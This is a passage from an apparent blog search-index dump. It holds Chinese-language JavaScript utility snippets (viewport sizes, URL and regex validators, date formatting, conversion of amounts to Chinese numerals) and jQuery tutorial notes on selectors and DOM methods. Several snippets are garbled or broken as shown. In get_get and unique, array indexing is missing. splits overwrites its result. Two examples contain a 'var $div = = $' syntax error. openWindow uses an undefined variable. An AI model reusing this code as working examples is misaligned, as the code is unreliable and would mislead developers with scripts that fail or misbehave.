&#125;else&#123; return screenWidth / document.body.offsetWidth; &#125;&#125; 获取移动设备屏幕宽度 1234567891011function getScreenWidth()&#123; var smallerSide = Math.min(screen.width, screen.height); var fixViewPortsExperiment = rendererModel.runningExperiments.FixViewport || rendererModel.runningExperiments.fixviewport; var fixViewPortsExperimentRunning = fixViewPortsExperiment &amp;&amp; (fixViewPortsExperiment.toLowerCase() === \"new\"); if(fixViewPortsExperiment)&#123; if(this.isAndroidMobileDevice() &amp;&amp; !this.isNewChromeOnAndroid())&#123; smallerSide = smallerSide/window.devicePixelRatio; &#125; &#125; return smallerSide;&#125; 完美判断是否为网址 12345678function IsURL(strUrl) &#123; var regular = /^\\b(((https?|ftp):\\/\\/)?[-a-z0-9]+(\\.[-a-z0-9]+)*\\.(?:com|edu|gov|int|mil|net|org|biz|info|name|museum|asia|coop|aero|[a-z][a-z]|((25[0-5])|(2[0-4]\\d)|(1\\d\\d)|([1-9]\\d)|\\d))\\b(\\/[-a-z0-9_:\\@&amp;?=+,.!\\/~%\\$]*)?)$/i if (regular.test(strUrl)) &#123; return true; &#125;else &#123; return false; &#125;&#125; 获取页面高度 123456function getPageHeight()&#123; var g = document, a = g.body, f = g.documentElement, d = g.compatMode == \"BackCompat\" ? a : g.documentElement; return Math.max(f.scrollHeight, a.scrollHeight, d.clientHeight);&#125; 获取页面scrollLeft 1234function getPageScrollLeft()&#123; var a = document; return a.documentElement.scrollLeft || a.body.scrollLeft;&#125; 获取页面可视宽度 123456function getPageViewWidth()&#123; var d = document, a = d.compatMode == \"BackCompat\" ? d.body : d.documentElement; return a.clientWidth;&#125; 获取页面宽度 123456function getPageWidth()&#123; var g = document, a = g.body, f = g.documentElement, d = g.compatMode == \"BackCompat\" ? a : g.documentElement; return Math.max(f.scrollWidth, a.scrollWidth, d.clientWidth);&#125; 获取页面scrollTop 1234function getPageScrollTop()&#123; var a = document; return a.documentElement.scrollTop || a.body.scrollTop;&#125; 获取页面可视高度 123456function getPageViewHeight() &#123; var d = document, a = d.compatMode == \"BackCompat\" ? d.body : d.documentElement; return a.clientHeight;&#125; 去掉url前缀 1234567function removeUrlPrefix(a)&#123; a=a.replace(/：/g,\":\").replace(/．/g,\".\").replace(/／/g,\"/\"); while(trim(a).toLowerCase().indexOf(\"http://\")==0)&#123; a=trim(a.replace(/http:\\/\\//i,\"\")); &#125; return a;&#125; 随机数时间戳 1234function uniqueId()&#123; var a=Math.random,b=parseInt; return Number(new Date()).toString()+b(10*a())+b(10*a())+b(10*a());&#125; 全角半角转换 1234567891011121314151617181920212223242526272829//iCase: 0全到半，1半到全，其他不转化function chgCase(sStr,iCase)&#123; if(typeof sStr != \"string\" || sStr.length &lt;= 0 || !(iCase === 0 || iCase == 1))&#123; return sStr; &#125; var i,oRs=[],iCode; if(iCase)&#123;/*半-&gt;全*/ for(i=0; i&lt;sStr.length;i+=1)&#123; iCode = sStr.charCodeAt(i); if(iCode == 32)&#123; iCode = 12288; &#125;else if(iCode &lt; 127)&#123; iCode += 65248; &#125; oRs.push(String.fromCharCode(iCode)); &#125; &#125;else&#123;/*全-&gt;半*/ for(i=0; i&lt;sStr.length;i+=1)&#123; iCode = sStr.charCodeAt(i); if(iCode == 12288)&#123; iCode = 32; &#125;else if(iCode &gt; 65280 &amp;&amp; iCode &lt; 65375)&#123; iCode -= 65248; &#125; oRs.push(String.fromCharCode(iCode)); &#125; &#125; return oRs.join(\"\"); &#125; 确认是否键盘有效输入值 12345678910function checkKey(iKey)&#123; if(iKey == 32 || iKey == 229)&#123;return true;&#125;/*空格和异常*/ if(iKey&gt;47 &amp;&amp; iKey &lt; 58)&#123;return true;&#125;/*数字*/ if(iKey&gt;64 &amp;&amp; iKey &lt; 91)&#123;return true;&#125;/*字母*/ if(iKey&gt;95 &amp;&amp; iKey &lt; 108)&#123;return true;&#125;/*数字键盘1*/ if(iKey&gt;108 &amp;&amp; iKey &lt; 112)&#123;return true;&#125;/*数字键盘2*/ if(iKey&gt;185 &amp;&amp; iKey &lt; 193)&#123;return true;&#125;/*符号1*/ if(iKey&gt;218 &amp;&amp; iKey &lt; 223)&#123;return true;&#125;/*符号2*/ return false;&#125; 日期格式化函数+调用方法 12345678910111213141516171819Date.prototype.format = function(format)&#123; var o = &#123; \"M+\" : this.getMonth()+1, //month \"d+\" : this.getDate(), //day \"h+\" : this.getHours(), //hour \"m+\" : this.getMinutes(), //minute \"s+\" : this.getSeconds(), //second \"q+\" : Math.floor((this.getMonth()+3)/3), //quarter \"S\" : this.getMilliseconds() //millisecond &#125;; if(/(y+)/.test(format)) format=format.replace(RegExp.$1,(this.getFullYear()+\"\").substr(4 - RegExp.$1.length)); for(var k in o)&#123; if(new RegExp(\"(\"+ k +\")\").test(format)) format = format.replace(RegExp.$1,RegExp.$1.length==1 ? o[k] :(\"00\"+ o[k]).substr((\"\"+ o[k]).length)); &#125; return format;&#125;alert(new Date().format(\"yyyy-MM-dd hh:mm:ss\")); 常用的正则表达式 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061//正整数/^[0-9]*[1-9][0-9]*$/;//负整数/^-[0-9]*[1-9][0-9]*$/;//正浮点数/^(([0-9]+\\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\\.[0-9]+)|([0-9]*[1-9][0-9]*))$/; //负浮点数/^(-(([0-9]+\\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\\.[0-9]+)|([0-9]*[1-9][0-9]*)))$/; //浮点数/^(-?\\d+)(\\.\\d+)?$/;//email地址/^[\\w-]+(\\.[\\w-]+)*@[\\w-]+(\\.[\\w-]+)+$/;//url地址/^[a-zA-z]+://(\\w+(-\\w+)*)(\\.(\\w+(-\\w+)*))*(\\?\\S*)?$/;或：^http:\\/\\/[A-Za-z0-9]+\\.[A-Za-z0-9]+[\\/=\\?%\\-&amp;_~`@[\\]\\&apos;:+!]*([^&lt;&gt;\\&quot;\\&quot;])*$ //年/月/日（年-月-日、年.月.日）/^(19|20)\\d\\d[- /.](0[1-9]|1[012])[- /.](0[1-9]|[12][0-9]|3[01])$/;//匹配中文字符/[\\u4e00-\\u9fa5]/;//匹配帐号是否合法(字母开头，允许5-10字节，允许字母数字下划线)/^[a-zA-Z][a-zA-Z0-9_]&#123;4,9&#125;$/;//匹配空白行的正则表达式/\\n\\s*\\r/;//匹配中国邮政编码/[1-9]\\d&#123;5&#125;(?!\\d)/;//匹配身份证/\\d&#123;15&#125;|\\d&#123;18&#125;/;//匹配国内电话号码/(\\d&#123;3&#125;-|\\d&#123;4&#125;-)?(\\d&#123;8&#125;|\\d&#123;7&#125;)?/;//匹配IP地址/((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.)&#123;3&#125;(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)/;//匹配首尾空白字符的正则表达式/^\\s*|\\s*$/;//匹配HTML标记的正则表达式&lt; (\\S*?)[^&gt;]*&gt;.*?|&lt; .*? /&gt;;//sql 语句^(select|drop|delete|create|update|insert).*$//提取信息中的网络链接(h|H)(r|R)(e|E)(f|F) *= *(&apos;|&quot;)?(\\w|\\\\|\\/|\\.)+(&apos;|&quot;| *|&gt;)? //提取信息中的邮件地址\\w+([-+.]\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)* //提取信息中的图片链接(s|S)(r|R)(c|C) *= *(&apos;|&quot;)?(\\w|\\\\|\\/|\\.)+(&apos;|&quot;| *|&gt;)? //提取信息中的 IP 地址(\\d+)\\.(\\d+)\\.(\\d+)\\.(\\d+)//取信息中的中国手机号码(86)*0*13\\d&#123;9&#125; //提取信息中的中国邮政编码[1-9]&#123;1&#125;(\\d+)&#123;5&#125; //提取信息中的浮点数（即小数）(-?\\d*)\\.?\\d+ //提取信息中的任何数字(-?\\d*)(\\.\\d+)?//电话区号^0\\d&#123;2,3&#125;$//腾讯 QQ 号^[1-9]*[1-9][0-9]*$ //帐号（字母开头，允许 5-16 字节，允许字母数字下划线）^[a-zA-Z][a-zA-Z0-9_]&#123;4,15&#125;$ //中文、英文、数字及下划线^[\\u4e00-\\u9fa5_a-zA-Z0-9]+$ 返回顶部的通用方法 1234567891011121314151617181920function backTop(btnId) &#123; var btn = document.getElementById(btnId); var d = document.documentElement; var b = document.body; window.onscroll = set; btn.style.display = \"none\"; btn.onclick = function() &#123; btn.style.display = \"none\"; window.onscroll = null; this.timer = setInterval(function() &#123; d.scrollTop -= Math.ceil((d.scrollTop + b.scrollTop) * 0.1); b.scrollTop -= Math.ceil((d.scrollTop + b.scrollTop) * 0.1); if ((d.scrollTop + b.scrollTop) == 0) clearInterval(btn.timer, window.onscroll = set); &#125;, 10); &#125;; function set() &#123; btn.style.display = (d.scrollTop + b.scrollTop &gt; 100) ? 'block': \"none\" &#125;&#125;;backTop('goTop'); 获得URL中GET参数值 1234567891011121314// 用法：如果地址是 test.htm?t1=1&amp;t2=2&amp;t3=3, 那么能取得：GET[\"t1\"], GET[\"t2\"], GET[\"t3\"]function get_get()&#123; querystr = window.location.href.split(\"?\") if(querystr[1])&#123; GETs = querystr[1].split(\"&amp;\"); GET = []; for(i=0;i&lt;GETs.length;i++)&#123; tmp_arr = GETs.split(\"=\") key=tmp_arr[0] GET[key] = tmp_arr[1] &#125; &#125; return querystr[1];&#125; 打开一个窗体通用方法 1234567891011121314151617181920function openWindow(url,windowName,width,height)&#123; var x = parseInt(screen.width / 2.0) - (width / 2.0); var y = parseInt(screen.height / 2.0) - (height / 2.0); var isMSIE= (navigator.appName == \"Microsoft Internet Explorer\"); if (isMSIE) &#123; var p = \"resizable=1,location=no,scrollbars=no,width=\"; p = p+width; p = p+\",height=\"; p = p+height; p = p+\",left=\"; p = p+x; p = p+\",top=\"; p = p+y; retval = window.open(url, windowName, p); &#125; else &#123; var win = window.open(url, \"ZyiisPopup\", \"top=\" + y + \",left=\" + x + \",scrollbars=\" + scrollbars + \",dialog=yes,modal=yes,width=\" + width + \",height=\" + height + \",resizable=no\" ); eval(\"try &#123; win.resizeTo(width, height); &#125; catch(e) &#123; &#125;\"); win.focus(); &#125;&#125; 提取页面代码中所有网址 12var aa = document.documentElement.outerHTML.match(/(url\\(|src=|href=)[\\\"\\']*([^\\\"\\'\\(\\)\\&lt;\\&gt;\\[\\] ]+)[\\\"\\'\\)]*|(http:\\/\\/[\\w\\-\\.]+[^\\\"\\'\\(\\)\\&lt;\\&gt;\\[\\] ]+)/ig).join(\"\\r\\n\").replace(/^(src=|href=|url\\()[\\\"\\']*|[\\\"\\'\\&gt;\\) ]*$/igm,\"\");alert(aa); 清除相同的数组 12345678910String.prototype.unique=function()&#123; var x=this.split(/[\\r\\n]+/); var y=''; for(var i=0;i&lt;x.length;i++)&#123; if(!new RegExp(\"^\"+x.replace(/([^\\w])/ig,\"\\\\$1\")+\"$\",\"igm\").test(y))&#123; y+=x+\"\\r\\n\" &#125; &#125; return y&#125;; 按字母排序，对每行进行数组排序 12345function SetSort()&#123; var text=K1.value.split(/[\\r\\n]/).sort().join(\"\\r\\n\");//顺序 var test=K1.value.split(/[\\r\\n]/).sort().reverse().join(\"\\r\\n\");//反序 K1.value=K1.value!=text?text:test;&#125; 清除html代码中的脚本 123456789101112function clear_script()&#123; K1.value=K1.value.replace(/&lt;script.*?&gt;[\\s\\S]*?&lt;\\/script&gt;|\\s+on[a-zA-Z]&#123;3,16&#125;\\s?=\\s?\"[\\s\\S]*?\"|\\s+on[a-zA-Z]&#123;3,16&#125;\\s?=\\s?'[\\s\\S]*?'|\\s+on[a-zA-Z]&#123;3,16&#125;\\s?=[^ &gt;]+/ig,\"\");&#125;动态执行JavaScript脚本 function javascript()&#123; try&#123; eval(K1.value); &#125;catch(e)&#123; alert(e.message); &#125;&#125; 金额大写转换函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374function transform(tranvalue) &#123; try &#123; var i = 1; var dw2 = new Array(\"\", \"万\", \"亿\"); //大单位 var dw1 = new Array(\"拾\", \"佰\", \"仟\"); //小单位 var dw = new Array(\"零\", \"壹\", \"贰\", \"叁\", \"肆\", \"伍\", \"陆\", \"柒\", \"捌\", \"玖\"); //整数部分用 //以下是小写转换成大写显示在合计大写的文本框中 //分离整数与小数 var source = splits(tranvalue); var num = source[0]; var dig = source[1]; //转换整数部分 var k1 = 0; //计小单位 var k2 = 0; //计大单位 var sum = 0; var str = \"\"; var len = source[0].length; //整数的长度 for (i = 1; i &lt;= len; i++) &#123; var n = source[0].charAt(len - i); //取得某个位数上的数字 var bn = 0; if (len - i - 1 &gt;= 0) &#123; bn = source[0].charAt(len - i - 1); //取得某个位数前一位上的数字 &#125; sum = sum + Number(n); if (sum != 0) &#123; str = dw[Number(n)].concat(str); //取得该数字对应的大写数字，并插入到str字符串的前面 if (n == '0') sum = 0; &#125; if (len - i - 1 &gt;= 0) &#123; //在数字范围内 if (k1 != 3) &#123; //加小单位 if (bn != 0) &#123; str = dw1[k1].concat(str); &#125; k1++; &#125; else &#123; //不加小单位，加大单位 k1 = 0; var temp = str.charAt(0); if (temp == \"万\" || temp == \"亿\") //若大单位前没有数字则舍去大单位 str = str.substr(1, str.length - 1); str = dw2[k2].concat(str); sum = 0; &#125; &#125; if (k1 == 3)&#123; //小单位到千则大单位进一 k2++; &#125; &#125; //转换小数部分 var strdig = \"\"; if (dig != \"\") &#123; var n = dig.charAt(0); if (n != 0) &#123; strdig += dw[Number(n)] + \"角\"; //加数字 &#125; var n = dig.charAt(1); if (n != 0) &#123; strdig += dw[Number(n)] + \"分\"; //加数字 &#125; &#125; str += \"元\" + strdig; &#125; catch(e) &#123; return \"0元\"; &#125; return str;&#125;//拆分整数与小数function splits(tranvalue) &#123; var value = new Array('', ''); temp = tranvalue.split(\".\"); for (var i = 0; i &lt; temp.length; i++) &#123; value = temp; &#125; return value;&#125; 获取窗体可见范围的宽与高 1234567function getViewSize()&#123; var de=document.documentElement; var db=document.body; var viewW=de.clientWidth==0 ? db.clientWidth : de.clientWidth; var viewH=de.clientHeight==0 ? db.clientHeight : de.clientHeight; return Array(viewW ,viewH);&#125;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"Snippet","slug":"Snippet","permalink":"https://ru23.com/tags/Snippet/"}]},{"title":"jQuery笔记总结篇","slug":"2016-10-review-jQuery","date":"2016-10-20T01:35:08.000Z","updated":"2018-10-24T03:46:01.930Z","comments":true,"path":"note/ed6083ef.html","link":"","permalink":"https://ru23.com/note/ed6083ef.html","excerpt":"原文链接 http://blog.poetries.top/2016/10/20/review-jQuery 首先，来了解一下jQuery学习的整体思路","text":"原文链接 http://blog.poetries.top/2016/10/20/review-jQuery 首先，来了解一下jQuery学习的整体思路 XMind源文件提供参考下载 第一节 jQuery初步认知 jQuery概述 JQuery概念 javascript概念 基于Js语言的API和语法组织逻辑，通过内置window和document对象，来操作内存中的DOM元素 JQuery概念 基于javascript的，同上，提高了代码的效率 jQuery是什么: 是一个javascript代码仓库，我们称之为javascript框架。 是一个快速的简洁的javascript框架，可以简化查询DOM对象、处理事件、制作动画、处理Ajax交互过程。 它可以帮我们做什么(有什么优势) 轻量级、体积小，使用灵巧(只需引入一个js文件) 强大的选择器 出色的DOM操作的封装 出色的浏览器兼容性 可靠的事件处理机制 完善的Ajax 链式操作、隐式迭代 方便的选择页面元素(模仿CSS选择器更精确、灵活) 动态更改页面样式/页面内容(操作DOM，动态添加、移除样式) 控制响应事件(动态添加响应事件) 提供基本网页特效(提供已封装的网页特效方法) 快速实现通信(ajax) 易扩展、插件丰富 如何引入JQuery包 引入本地的JQuery 引入Google在线提供的库文件（稳定可靠高速） 使用Google提供的API导入 &lt;script type=“text/javascript” src=“jquery.js”&gt;&lt;/script&gt; 写第一个JQUery案例 解释:在JQuery库中，$是JQuery的别名，$()等效于就jQuery() 123456&lt;script type=“text/javascript” src=“”&gt;&lt;/script&gt;&lt;script type=“text/javascript”&gt; $(function()&#123; alert(“jQuery 你好!”); &#125;);&lt;/script&gt; 讲解$(function(){}); $是jQuery别名。如$()也可jQuery()这样写,相当于页面初始化函数，当页面加载完毕，会执行jQuery()。 希望在做所有事情之前，JQuery操作DOM文档。必须确保在DOM载入完毕后开始执行，应该用ready事件做处理HTML文档的开始 $(document).ready(function(){}); 类似于js的window.onload事件函数，但是ready事件要先于onload事件执行 window.onload = function(){}; 为方便开发，jQuery简化这样的方法，直接用$()表示 JQuery的ready事件不等于Js的load： 执行时机不同：load需要等外部图片和视频等全部加载才执行。ready是DOM绘制完毕后执行，先与外部文件 用法不同：load只可写一次，ready可以多次 window.onload与$(document).ready()对比 window.onload $(document).ready() 执行时机 必须等网页中所有内容加载完后(图片)才执行 网页中的DOM结构绘制完后就执行,可能DOM元素相关的东西并没有加载完 编写个数 不能同时执行多个 能同时执行多个 简化写法 无 $(document).ready(function(){ //.. });推荐写法：$(function(){ }); jQuery有哪些功能(API)： 选择器 过滤器 事件 效果 ajax 简单的JQuery选择器： JQuery基本选择器（ID选择器，标签选择器，类选择器，通配选择器和组选择器5种） ID选择器：document.getElementById(id)与$(&quot;#id&quot;)对比(改变文字大小)—id唯一，返回单个元素 标签选择器：document.getElementsByTagName(tagName)与$(&quot;tagname&quot;)对比—多个标签，返回数组 类选择器:$(&quot;.className&quot;)–多个classname（改变背景图片） 通配选择器：document.getElementsByTagName(&quot;*&quot;)与$(&quot;*&quot;)对比—指范围内的所有标签元素 组选择器：$(&quot;seletor1,seletor2,seletor3&quot;)—-无数量限制，用逗号分割 初步了解JQuery JQuery是什么 javascript用来干什么的： 操作DOM对象 动态操作样式css 数据访问 控制响应事件等 jQuery作用一样，只是更加快速简洁 如何引用JQuery 12345678&lt;script type=\"text/javascript\"&gt;&lt;/script&gt;写第一个JQUery案例&lt;script type=“text/javascript” src=“”&gt;&lt;/script&gt;&lt;script type=“text/javascript”&gt; $(function()&#123; alert(“jQuery 你好!”); &#125;);&lt;/script&gt; $()讲解 $在JQuery库中，$是JQuery的别名，$()等效于就jQuery(). $()是JQuery方法,赞可看作是JQuery的选择器，与css选择器相似（可做对比） var jQuery==$ =function(){} $()本质就是一个函数也就是 jQuery的核心函数 只要是jQuery的对象都这样变量加上一个符号$方便识别：var $div = $(&quot;#&quot;) 123function $(id)&#123; return document.getElementById(id); &#125; $()和document是相等的吗 12345&lt;div id=\"a\" class=\"aa\"&gt;&lt;/div&gt;&lt;div id=\"b\" class=\"aa\"&gt;&lt;/div&gt;&lt;div id=\"c\" class=\"aa\"&gt;&lt;/div&gt;alert(document.getElementById(\"id\") == $(\"#aa\"));//返回结果为falsealert(document.getElementById(\"id\") == $(\"#aa\").get(0));//返回true 代理对象$() jQuery中返回的是代理对象本身 jQuery的核心原理是通过选择器找到对应的代理对象 jQuery全都是通过方法操作 样式选择器$(&quot;.className&quot;) $(&quot;.aa&quot;).css(&quot;color&quot;,&quot;green&quot;); id选择器(“”) $(&quot;#a&quot;).css(&quot;background-color&quot;,&quot;#ff0066&quot;); 标签选择器 $(&quot;p&quot;).css(&quot;color&quot;,&quot;#cc3366&quot;); 组选择器 $(&quot;#b ul li&quot;).size(); 对象转换($(element)) 原生dom对象和jquery代理对象的相互转换 12345$(传入的原生对象);//原生对象转化成jQuery对象var nav = document.getElementById(\"nav\");var $nav = $(nav);alert($nav.get(0) == nav);//true 检索范围的限制（$(&#39;字符串&#39;,element)） 总结：三种写法对比： 方式一：不推荐 搜索速度最慢 $(&quot;#nav&quot;).css(); $(&quot;#nav li&quot;).css(); 方式二：搜索速度最快 链式操作 $(&quot;#nav&quot;).css().children().css(); 方式三：也常用 速度第二快 var $nav = $(&quot;#nav&quot;).css(); $(&quot;li&quot;,$nav).css(); $nav限制了搜索范围 速度快 总结： $() jquery核心方法的作用和使用场景 如果是一个字符串参数并且没有标签对（选择器）$(ul.nav&quot;) 如果是一个字符串参数并且有标签对（创建html标签）$(&quot;&lt;img&gt;&quot;) –最终加到DOM树中 $xx.append(&quot;&lt;img&gt;&quot;); 如果是传入一个element dom对象，直接包装为proxy对象返回 $(DOM对象) 如果第一个参数是字符串，第二个是element dom对象的话，那么就是在element这个dom对象里面寻找选择器对应的元素并且代理 $(&quot;li&quot;,$DOM对象) 代理模式以及代理内存结构 代理内存结构2 第二节 选择器 来回顾一下CSS常用的选择器 选择器 语法 描述 标签选择器 E{css规则} 以文档元素作为选择符 ID选择器 #ID{css规则} ID作为选择符 类选择器 E.className{css规则} class作为选择符 群组选择器 E1,E2,E3{css规则} 多个选择符应用同样的样式 后代选择器 E F{css规则} 元素E的任意后代元素F 选择器引擎规则($(&#39;字符串&#39;)) css选择器的规则 标签选择器 id选择器 类选择器 混合选择器 css3的选择器规则 状态和伪类（:even :odd :first :last :eq(index)） 属性（[attr=value]） 层级选择器:通过DOM的嵌套关系匹配元素 jQuery层级选择器—-包含选择器、子选择器、相邻选择器、兄弟选择器4种 a.包含选择器：$(&quot;a b&quot;)在给定的祖先元素下匹配所有后代元素。(不受层级限制) b.子选择器：$(&quot;parent &gt; child&quot;)在给定的父元素下匹配所有子元素。 c.相邻选择器：$(&quot;prev + next&quot;) 匹配所有紧接在prev元素后的next元素。 d.兄弟选择器：$(&quot;prev ~ siblings&quot;) 匹配prev元素之后的所有sibling元素。 过滤选择器 基本过滤选择 选择器 说明 返回 :first 匹配找到的第1个元素 单个元素 :last 匹配找到的最后一个元素 单个元素 :eq 匹配一个给定索引值的元素 单个元素 :even 匹配所有索引值为偶数的元素 集合元素 : odd 匹配所有索引值为奇数的元素 集合元素 :gt(index) 匹配所有大于给定索引值的元素 集合元素 :lt(index) 匹配所有小于给定索引值的元素 集合元素 :not 去除所有与给定选择器匹配的元素 集合元素 :animated 选取当前正在执行动画的所有元素 集合元素 focus 选取当前正在获取焦点的元素 集合元素 内容过滤选择器 选择器 描述 返回 :contains(text) 选取含有文本内容为text的元素 集合元素 :empty 选取不包含子元素获取文本的空元素 集合元素 :has(selector) 选择含有选择器所匹配的元素的元素 集合元素 :parent 选取含有子元素或者文本的元素 集合元素 可见过滤选择器 选择器 描述 返回 :hidden 选择所有不可见的元素 集合元素 :visible 选取所有可见的元素 集合元素 属性过滤选择器 选择器 说明 返回 [attribute] 选取拥有此属性的元素 集合元素 [attribute=value] 选取属性值为value值的元素 集合元素 [attribue^=value] 选取属性的值以value开始的元素 集合元素 [attribue$=value] 选取属性的值以value结束的元素 集合元素 子元素过滤选择器 选择器 说明 返回 :nth-child(index/even/odd) 选取每个父元素下的第index个子元素或者奇偶元素（index从1算起） 集合元素 :first-child 选取每个元素的第一个子元素 集合元素 :last-child 选取每个元素的最后一个子元素 集合元素 :nth-child()选择器是很常用的子元素过滤选择器，如下 :nth-child(even)选择每个父元素下的索引值是偶数的元素 :nth-child(odd)选择每个父元素下的索引值是奇数的元素 :nth-child(2)选择每个父元素下的索引值是2的元素 :nth-child(3n)选择每个父元素下的索引值是3的倍数的元素 (n从1开始) 表单对象属性过滤选择器 选择器 说明 返回 :enabled 选取所有可用元素 集合元素 :disabled 选取所有不可用元素 集合元素 :checked 选取所有被选中的元素（单选框、复选框） 集合元素 :selected 选取所有被选中的元素（下拉列表） 集合元素 表单选择器 选择器 说明 :input 选取所有input textarea select button元素 :text 选取所有单行文本框 :password 选取所有密码框 :radio 选取所有单选框 :checkbox 选取所有多选框 :submit 选取所有的提交按钮 :image 选取所有的图像按钮 :reset 选取所有的重置按钮 :button 选取所有的按钮 :file 选取所有的上传域 :hidden 选取所有的不可见元素 特定位置选择器 :first :last :eq(index) 指定范围选择器 :even :odd :gt(index) :lt(index) 排除选择器 :not 非 第三节 选择器优化 使用合适的选择器表达式可以提高性能、增强语义并简化逻辑。常用的选择器中，ID选择器速度最快，其次是类型选择器。 a. 多用ID选择器 b. 少直接使用class选择器 c. 多用父子关系，少用嵌套关系 d. 缓存jQuery对象 使用过滤器 jQuery提供了2种选择文档元素的方式：选择器和过滤器 a. 类过虑器：根据元素的类属性来进行过滤操作。 hasClass(className)：判断当前jQuery对象中的某个元素是否包含指定类名，包含返回true，不包含返回false b. 下标过滤器：精确选出指定下标元素 eq(index)：获取第N个元素。index是整数值，下标从0开始 c. 表达式过滤器 filter(expr)/(fn)：筛选出与指定表达式/函数匹配的元素集合。 功能最强大的表达式过滤器，可接收函数参数，也可以是简单的选择器表达式 d. 映射 map(callback)：将一组元素转换成其他数组 e. 清洗 not(expr)：删除与指定表达式匹配的元素 f. 截取 slice(start,end)：选取一个匹配的子集 查找 向下查找后代元素 children():取得所有元素的所有子元素集合（子元素） find():搜索所有与指定表达式匹配的元素(所有后代元素中查找) 查找兄弟元素 siblings()查找当前元素的兄弟 第四节 代理对象属性和样式操作 代理对象属性和样式操作 attr prop(一般属性值是boolean的值或者不用设置属性值，一般使用) css(最好不用，一般我用来做测试) addClass / removeClass 操作原生DOM的时候用的方式：一次只能操作一个 操作属性：setAttribute / getAttribute 操作样式：style.xx = value 操作类样式：className=&#39;&#39; 获取DOM的子元素children属性 DOM里面添加一个子元素appendChild() 操作jQuery代理对象的时候：批量操作DOM对象(全都是通过方法操作) 操作属性：attr()、prop() attr和prop区别：如果属性的值是布尔类型的值 用prop操作 反之attr 操作样式：css() 操作类样式：addClass() removeClass() 操作DOM子元素：children() 添加子元素：append() 第五节 jQuery中DOM操作 DOM是一种与浏览器、平台|语言无关的接口，使用该接口可以轻松的访问 页面中的所有的标准组件 DOM操作的分类 DOM Core DOM core并不专属于JavaScript，任何支持DOM的程序都可以使用 JavaScript 中的getElementByID() getElementsByTagName() getAttribute() setAttribute()等方法都是DOM Core的组成部分 HTML-DOM HTML -DOM的出现比DOM-Core还要早，它提供一些更简明的标志来描述HTML元素的属性 比如：使用HTML-DOM来获取某元素的src属性的方法 element.src CSS-DOM 针对CSS的操作。在JavaScript中，主要用于获取和设置style对象的各种属性，通过改变style对象的属性，使网页呈现不同的效果 查找节点 查找属性节点 attr() 可以获取各属性的值 创建节点 $(html)：根据传递的标记字符串，创建DOM对象 插入节点 方法 说明 append() 向每个匹配元素内部追加内容 appendTo() 颠倒append()的操作 prepend() 向每个匹配元素的内容内部前置内容 prependTo() 颠倒prepend()的操作 after() 向每个匹配元素之后插入内容 insertAfter() 颠倒after()的操作 before() 在每个匹配元素之前插入内容 insertBefore() 颠倒before()的操作 删除节点 jQuery提供了三种删除节点的方法 remove() detach() empty() remove()方法 当某个节点用此方法删除后，该节点所包含的所有后代节点将同时被删除，用remove()方法删除后，还是可以继续使用删除后的引用 detach() 和remove()方法一样，也是从DOM中去掉所有匹配的元素，与remove()不同的是，所有绑定的事件、附加的数据等，都会被保留下来 empty() empty()方法并不是删除节点，而是清空节点，它能清空元素中所有后代节点 复制节点 使用clone()方法来完成 在clone()方法中传递一个参数true，同时复制元素中所绑定的事件 替换节点 jQuery提供相应的方法 replaceWidth() 样式操作 获取样式和设置样式 attr() 追加样式 addClass() 移除样式 removeClass() 切换样式 toggle()方法只要是控制行为上的重复切换（如果元素是显示的，则隐藏；如果元素原来是隐藏的，则显示） toggleClass()方法控制样式上的重复切换（如何类名存在，则删除它，如果类名不存在，则添加它） 判断是否含有某个样式 hasClass()可以用来判断元素是否含有某个class,如有返回true 该方法等价于is() 设置和获取HTML、文本和值 html() 此方法类似JavaScript中innerHTML属性，可以用来读取和设置某个元素中的HTML内容 text()方法 此方法类型JavaScript中innerHTML，用来读取和设置某个元素中的文本内容 val()方法 此方法类似JavaScript中的value属性，用来设置获取元素的值。无论是文本框、下拉列表还是单选框，都可以返回元素的值，如果元素多选，返回一个包含所有选择的值的数组 遍历节点 children()方法 该方法用来取得匹配元素的子元素集合 childre()方法只考虑子元素而不考虑其他后代元素 next()方法 该方法用于取得匹配元素后面紧邻的同辈元素 prev()方法 用于匹配元素前面紧邻的同辈元素 siblings()方法 用于匹配元素前后所有的同辈元素 parent()方法 获得集合中每个 元素的父级元素 parents()方法 获得集合中每个元素的祖先元素 CSS DOM操作 CSS DOM技术简单的来说就是读取和设置style对象的各种属性 用css()方法获取元素的样式属性，可以同时设置多个样式属性 CSS DOM中关于元素定位有几个常用的方法 offset()方法 它的作用是获取元素在当前视窗的相对偏移其中返回的对象包含两个属性，即top和left，他只对可见元素有效 position()方法 获取相对于最近的一个position()样式属性设置为relative或者absolute的祖父节点的相对偏移，与offset()一样，他返回的对象也包括两个属性，即top和left scrollTop()方法和scrollLeft方法 这两个方法的作用分别是获取元素的滚动条距顶端的距离和距左侧的距离 一张图总结以上的位置关系(项目中很常用-必须要弄清楚) 第六节 jQuery动画 回顾上节 操作DOM a.什么是DOM：Document Object Model缩写，文档对象模型 b.理解页面的树形结构 c.什么是节点：是DOM结构中最小单元，包括元素、属性、文本、文档等。 一、创建节点 1.创建元素 语法：document.createElement(name); 12var div = document.createElement(\"div\");document.body.appendChild(div); $(html)：根据传递的标记字符串，创建DOM对象 2.创建文本 123456789101112131415161718192021var div = document.createElement(\"div\");var txt = document.createTextNode(\"DOM\");div.appendChild(txt);document.body.appendChild(div);var $div = = $(\"&lt;div&gt;DOM&lt;/div&gt;\");$(body).append($div);``` - 3.设置属性 - 语法：`e.setAttrbute(name,value)````javascriptvar div = document.createElement(\"div\");var txt = document.createTextNode(\"DOM\");div.appendChild(txt);document.body.appendChild(div);div.setAttribute(\"title\",\"盒子\");var $div = = $(\"&lt;div title='盒子'&gt;DOM&lt;/div&gt;\");$(body).append($div); 二、插入内容 内部插入 向元素最后面插入节点： append():向每个匹配的元素内部追加内容 appendTo():把所有匹配的元素追加到指定元素集合中，$(&quot;A&quot;).append(&quot;B&quot;)等效 $(&quot;B&quot;).appendTo(&quot;A&quot;) 